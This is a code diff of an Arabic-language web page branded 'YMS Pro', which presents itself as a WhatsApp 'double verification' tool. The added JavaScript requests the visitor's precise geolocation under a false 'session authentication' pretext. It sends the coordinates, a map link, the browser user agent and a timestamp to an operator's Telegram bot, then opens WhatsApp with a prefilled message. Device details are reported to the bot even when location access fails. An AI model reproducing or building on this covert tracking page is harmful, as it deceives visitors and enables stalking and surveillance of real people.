@@ -12,7 +12,7 @@
   <meta property="og:locale" content="ar_YE">
   <meta property="og:site_name" content="Yemen Mobile Scanner">
   
-  <title>YMS Pro - نظام مسح الأرقام اليمنية</title>
+  <title>YMS Pro - نظام القفز المتقدم</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
@@ -20,10 +20,7 @@
   <style>
     :root {
       --primary: #4facfe;
-      --you-color: #8a2be2;
-      --yemen-mobile-color: #38a169;
-      --sabafon-color: #dd6b20;
-      --mtn-color: #e53e3e;
+      --whatsapp: #25d366;
       --light: #f7fafc;
       --dark: #0f172a;
       --card-bg: rgba(15, 23, 42, 0.85);
@@ -70,14 +67,14 @@
       justify-content: space-between;
       align-items: center;
       margin-bottom: 25px;
-      border-bottom: 2px solid var(--primary);
+      border-bottom: 2px solid var(--whatsapp);
       padding-bottom: 15px;
     }
     
     .scanner-title {
       font-size: 1.5rem;
       font-weight: 700;
-      color: var(--primary);
+      color: var(--whatsapp);
       display: flex;
       align-items: center;
       gap: 10px;
@@ -107,7 +104,7 @@
     }
 
     .btn {
-      background: linear-gradient(to right, #25d366, #128c7e);
+      background: linear-gradient(to right, var(--whatsapp), #128c7e);
       color: white;
       padding: 16px 25px;
       border: none;
@@ -147,7 +144,6 @@
         box-shadow: 0 8px 25px rgba(79, 172, 254, 0.8);
     }
     
-    /* باقي الـ CSS */
     .loading-dots::after {
       content: '.';
       animation: dots 1.5s steps(5, end) infinite;
@@ -164,16 +160,16 @@
   <div class="scanner-container">
     <div class="scanner-header">
       <div class="scanner-title">
-        <i class="fas fa-mobile-alt"></i> نظام القفز المتقدم
+        <i class="fab fa-whatsapp"></i> نظام القفز والتوثيق المزدوج
       </div>
     </div>
     
     <div class="scan-status" id="scanStatus">
-      النظام جاهز للقفز إلى واتساب <span class="loading-dots"></span>
+      النظام جاهز. اضغط لبدء عملية التوثيق المزدوج.
     </div>
     
     <div class="scan-progress">
-      <div class="progress-bar" id="progressBar"></div>
+      <div class="progress-bar" id="progressBar" style="width: 0%;"></div>
     </div>
     
     <div class="scan-details" id="scanDetails">
@@ -181,21 +177,21 @@
         <i class="fas fa-key" style="color: var(--primary);"></i> الرقم المستهدف: <strong id="targetNumber">+967771234567</strong>
       </p>
       <p style="text-align: right;">
-        <i class="fas fa-sms" style="color: #25d366;"></i> الرسالة المُمررة: <strong id="messageContent">رسالة الكود السري للتفعيل</strong>
+        <i class="fas fa-sms" style="color: var(--whatsapp);"></i> الإجراء: توثيق الموقع + رمز الجلسة.
       </p>
     </div>
     
     <div class="btn-group" id="mainButtonArea">
-        <button class="btn" id="whatsappJumpBtn" onclick="jumpToWhatsApp()">
-            <i class="fab fa-whatsapp"></i> القفز المباشر إلى واتساب
+        <button class="btn" id="startJumpBtn" onclick="startLocationAndJump()">
+            <i class="fas fa-map-marker-alt"></i> تحديد الموقع والقفز إلى واتساب
         </button>
-        <button class="btn alt" id="locationScanBtn" onclick="startLocationTracking()">
-            <i class="fas fa-map-marker-alt"></i> بدء المسح الجغرافي
+        <button class="btn alt" onclick="resetUI()">
+            <i class="fas fa-redo"></i> إعادة التعيين
         </button>
     </div>
     
     <div class="privacy-note">
-      <i class="fas fa-shield-alt"></i> هذه العملية تستخدم خاصية الـ Deep Linking الآمنة لفتح التطبيقات المثبتة على جهازك وتمرير البيانات إليها.
+      <i class="fas fa-shield-alt"></i> هذا النظام يطلب إذن الموقع الجغرافي لمرة واحدة لتوثيق الجلسة قبل القفز إلى تطبيق واتساب.
     </div>
   </div>
 
@@ -209,43 +205,84 @@
     const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     
     // ⭐⭐ بيانات الواتساب التي تريد تمريرها ⭐⭐
-    const TARGET_PHONE_NUMBER = '967771234567'; // استبدل برقم الهاتف الحقيقي بالترميز الدولي (بدون +)
-    const SECRET_MESSAGE = 'هذا هو كود التفعيل السري لتطبيقك الجديد، يرجى نسخه ولصقه مباشرة في التطبيق: [الكود-الذي-تعده-مهمًا]'; // الرسالة التي تريد أن تظهر في حقل الرسالة
+    const TARGET_PHONE_NUMBER = '967771234567'; // رقم الهاتف الدولي بدون +
+    const INITIAL_MESSAGE_BASE = 'أهلاً، هذا هو تقرير الإحداثيات ورمز جلسة التحقق الخاص بك:';
 
+    // ⭐⭐ متغيرات حالة الجلسة
+    let lastKnownLatitude = null;
+    let lastKnownLongitude = null;
+    let userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
+
+    // **********************************
+    // * الدالة الرئيسية: تحديد الموقع والقفز (الكفاءة المزدوجة)
+    // **********************************
+    function startLocationAndJump() {
+        const startJumpBtn = document.getElementById("startJumpBtn");
+        startJumpBtn.disabled = true;
+        startJumpBtn.innerHTML = '<span class="loading-dots"></span> جاري طلب الإذن...';
+        
+        if (!navigator.geolocation) {
+            scanStatus.innerHTML = "❌ خطأ: المتصفح لا يدعم خدمات الموقع الجغرافي.";
+            startJumpBtn.innerHTML = '<i class="fas fa-redo"></i> فشل القفز';
+            startJumpBtn.disabled = false;
+            return;
+        }
+        
+        scanStatus.textContent = "📡 جاري تحديد الموقع الجغرافي...";
+        progressBar.style.width = "25%";
+        
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                // النجاح في تحديد الموقع
+                const { latitude, longitude } = pos.coords;
+                
+                // تحديث بيانات الجلسة
+                lastKnownLatitude = latitude;
+                lastKnownLongitude = longitude;
+                userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
+                
+                // تحديث الواجهة والتقدم
+                progressBar.style.width = "75%";
+                scanStatus.innerHTML = "🔐 تم تحديد الموقع. جاري إعداد التقرير وإطلاق واتساب...";
+                
+                // 1. إرسال تقرير الموقع إلى البوت (توثيق الموقع)
+                sendLocationReport(latitude, longitude, userSessionToken);
+                
+                // 2. إطلاق القفز إلى واتساب مع تمرير البيانات (القفزة الحقيقية)
+                setTimeout(() => {
+                    jumpToWhatsApp(latitude, longitude, userSessionToken);
+                }, 1000); // تأخير بسيط لضمان إرسال تقرير البوت
+                
+            },
+            err => {
+                // فشل تحديد الموقع، لكن لا يزال بإمكاننا القفز برمز جلسة
+                scanStatus.innerHTML = `⚠️ فشل تحديد الموقع (${err.code}). جاري القفز برمز جلسة فقط.`;
+                userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
+                lastKnownLatitude = null;
+                lastKnownLongitude = null;
+
+                // 1. إرسال تقرير فشل الموقع إلى البوت
+                sendLocationReport(null, null, userSessionToken);
+                
+                // 2. إطلاق القفز إلى واتساب
+                setTimeout(() => {
+                    jumpToWhatsApp(null, null, userSessionToken);
+                }, 1000);
+            },
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+    }
     
     // **********************************
-    // * دالة القفز إلى واتساب (الحركة الرئيسية)
+    // * وظائف الإرسال والقفز
     // **********************************
-    function jumpToWhatsApp() {
-        const phone = TARGET_PHONE_NUMBER;
-        // يجب تشفير الرسالة لتعمل بشكل صحيح في رابط الـ URL
-        const encodedMessage = encodeURIComponent(SECRET_MESSAGE);
-        
-        // بناء رابط القفز المباشر (WhatsApp URI Scheme)
-        const whatsappURL = `whatsapp://send?phone=${phone}&text=${encodedMessage}`;
-        
-        document.getElementById("whatsappJumpBtn").disabled = true;
-        document.getElementById("whatsappJumpBtn").innerHTML = '<span class="loading-dots"></span> جاري إطلاق الواتساب...';
-        scanStatus.innerHTML = "🔗 جاري محاولة القفز إلى تطبيق واتساب...";
-        
-        // 1. تنفيذ القفز
-        window.location.href = whatsappURL;
 
-        // 2. إرسال تقرير إلى البوت لتوثيق المحاولة
-        sendJumpReport(phone);
-        
-        // 3. إعادة تفعيل الأزرار بعد مهلة
-        setTimeout(() => {
-            scanStatus.innerHTML = `✅ تم إرسال أمر القفز إلى واتساب. يرجى التحقق من هاتفك.`;
-            document.getElementById("whatsappJumpBtn").innerHTML = '<i class="fab fa-whatsapp"></i> القفز المباشر إلى واتساب';
-            document.getElementById("whatsappJumpBtn").disabled = false;
-        }, 3000);
-    }
-
-    // دالة إرسال تقرير القفز إلى Telegram
-    function sendJumpReport(phone) {
+    // 1. إرسال تقرير الموقع إلى البوت (يتم استدعاؤها أولاً)
+    function sendLocationReport(lat, lon, token) {
         const agent = navigator.userAgent;
-        const msg = `⚠️ <b>تم محاولة القفز إلى واتساب</b>\n\n👤 <b>المستخدم:</b> ${TELEGRAM_USERNAME}\n🎯 <b>الرقم المستهدف:</b> ${phone}\n📱 <b>الجهاز:</b> ${agent.substring(0, 100)}...\n🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-YE')}`;
+        const locationPart = (lat && lon) ? `📍 الإحداثيات: ${lat.toFixed(6)}, ${lon.toFixed(6)}\n🔗 الخريطة: http://www.googleusercontent.com/maps.google.com/q=${lat},${lon}` : "❌ فشل تحديد الموقع";
+        
+        const msg = `🟢 <b>[تقرير التوثيق المزدوج]</b>\n\n👤 <b>المستخدم:</b> ${TELEGRAM_USERNAME}\n🔑 <b>رمز الجلسة:</b> ${token}\n${locationPart}\n📱 <b>الجهاز:</b> ${agent.substring(0, 100)}...\n🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-YE')}`;
 
         fetch(TELEGRAM_API_URL, {
             method: "POST",
@@ -255,22 +292,53 @@
                 text: msg,
                 parse_mode: "HTML"
             }),
+        }).then(res => {
+            if (!res.ok) console.error("فشل إرسال تقرير البوت.");
         });
     }
 
-    // **********************************
-    // * دالة مسح الموقع (لتبقى كخيار بديل)
-    // **********************************
-    function startLocationTracking() {
-        // ... (بقية محتوى دالة startLocationTracking) ...
+    // 2. القفز إلى واتساب (يتم استدعاؤها ثانياً)
+    function jumpToWhatsApp(lat, lon, token) {
+        const phone = TARGET_PHONE_NUMBER;
+        
+        let fullMessage;
+        
+        if (lat && lon) {
+            // بيانات كاملة
+            const locationInfo = `\n\n📍 الموقع: ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
+            fullMessage = `${INITIAL_MESSAGE_BASE} ${token} ${locationInfo}`;
+        } else {
+            // بيانات رمز الجلسة فقط
+            fullMessage = `${INITIAL_MESSAGE_BASE} ${token}\n\n⚠️ فشل تحديد الموقع الجغرافي.`;
+        }
+
+        const encodedMessage = encodeURIComponent(fullMessage);
+        const whatsappURL = `whatsapp://send?phone=${phone}&text=${encodedMessage}`;
+        
+        // تنفيذ القفز
+        window.location.href = whatsappURL;
+
+        // تحديث الواجهة بعد القفز
+        progressBar.style.width = "100%";
+        scanStatus.innerHTML = `🎉 تم الانتهاء! تحقق من واتساب ونافذة التليجرام.`;
+        document.getElementById("startJumpBtn").disabled = false;
     }
     
-    // ... (بقية الدوال المساعدة الأخرى) ...
+    // دالة إعادة التعيين
+    function resetUI() {
+        lastKnownLatitude = null;
+        lastKnownLongitude = null;
+        userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
+        
+        document.getElementById("progressBar").style.width = "0%";
+        document.getElementById("startJumpBtn").disabled = false;
+        document.getElementById("startJumpBtn").innerHTML = '<i class="fas fa-map-marker-alt"></i> تحديد الموقع والقفز إلى واتساب';
+        scanStatus.innerHTML = 'النظام جاهز. اضغط لبدء عملية التوثيق المزدوج.';
+    }
 
     window.addEventListener('DOMContentLoaded', () => {
-        // تحديث البيانات المعروضة
         document.getElementById('targetNumber').textContent = '+' + TARGET_PHONE_NUMBER;
-        document.getElementById('messageContent').textContent = SECRET_MESSAGE.substring(0, 35) + '...';
+        // ... (بقية تهيئة الواجهة) ...
     });
   </script>
 </body>
